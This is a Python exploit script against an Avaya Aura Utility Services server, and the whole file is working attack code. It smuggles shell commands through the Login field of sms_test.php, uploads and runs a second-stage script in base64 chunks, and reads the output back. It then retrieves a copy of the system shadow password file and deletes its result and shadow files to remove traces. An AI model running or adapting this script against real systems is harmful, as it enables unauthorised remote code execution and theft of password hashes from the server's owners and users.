#!/usr/bin/python

import requests
import sys
import base64
import time

from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

if len(sys.argv) != 2:
    print("Usage: {0} <https://avayaaurautiltiesserver>".format(sys.argv[0]))
    exit(-1)


base_url = sys.argv[1] + ("/" if not sys.argv[1].endswith("/") else "")
upload_url = base_url + "sms/sms_test.php"
result_url = base_url + "tmp/results.txt"
shadow_url = base_url + "tmp/shadow"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
}

inject_template = "avaya@127.0.0.1:22&{0}|"

with open("stage2.py") as f:
    data = base64.b64encode(f.read())

# Data must be chunked as too big of a value will cause a server error
chunks = [data[i : i + 6000] for i in range(0, len(data), 6000)]
i = 0

data_template = {
    "Password": "avaya",
    "SMSHost": "https://127.0.0.1",
    "SOAP_Timeout": "5",
    "Model": "AARAnalysis",
    "Op": "list",
    "Objectname": "",
    "Qualifier": "",
    "Fields": "*",
    "RecordRequest": "0",
    "RecordResultData": "0",
    "saw_form_id": "sms_test",
    "saw_form_next": "submit",
    "submitRequest": "Submit Request",
    "SessionID": "",
}

for chunk in chunks:
    i += 1

    data = data_template

    if i == 1:
        data["Login"] = inject_template.format("echo " + chunk + " >/tmp/stage0")
    else:
        data["Login"] = inject_template.format("echo " + chunk + " >>/tmp/stage0")

    print("Uploading Stage 2 Chunk {0}...".format(i))

    try:
        r = requests.post(
            upload_url, headers=headers, data=data, verify=False, timeout=5
        )
    except requests.exceptions.ReadTimeout:
        pass

print("Reconstituting Stage 2...")

data = data_template
data["Login"] = inject_template.format("base64 -d /tmp/stage0 >/tmp/stage2.py")

try:
    r = requests.post(upload_url, headers=headers, data=data, verify=False, timeout=5)
except requests.exceptions.ReadTimeout:
    pass

print("Executing Stage 2...")

data = data_template
data["Login"] = inject_template.format(
    "/usr/bin/python /tmp/stage2.py >/tmp/results.txt"
)

try:
    r = requests.post(upload_url, headers=headers, data=data, verify=False, timeout=5)
except requests.exceptions.ReadTimeout:
    pass

print("Reading Results...")

text = ""
current_lines = 0

while "Done." not in text:
    try:
        r = requests.post(result_url, headers=headers, verify=False)

        if r.status_code == 200:
            text = r.text
            lines = text.split("\n")

            for line in lines[current_lines:]:
                if len(line.strip()) > 0:
                    print(line.strip())

            current_lines = len(lines) - 1
    except:
        pass

print("Removing Results File...")

data = data_template
data["Login"] = inject_template.format("rm -f /tmp/results.txt")

try:
    r = requests.post(upload_url, headers=headers, data=data, verify=False, timeout=0.1)
except requests.exceptions.ReadTimeout:
    pass

print("Waiting for shadow file to appear...\n")

while True:
    r = requests.post(shadow_url, headers=headers, verify=False)

    if r.status_code == 200:
        print(r.text)
        break

    time.sleep(5)

print("Removing shadow copy...")

data = data_template
data["Login"] = inject_template.format("rm -f /tmp/shadow")

try:
    r = requests.post(upload_url, headers=headers, data=data, verify=False, timeout=0.1)
except requests.exceptions.ReadTimeout:
    pass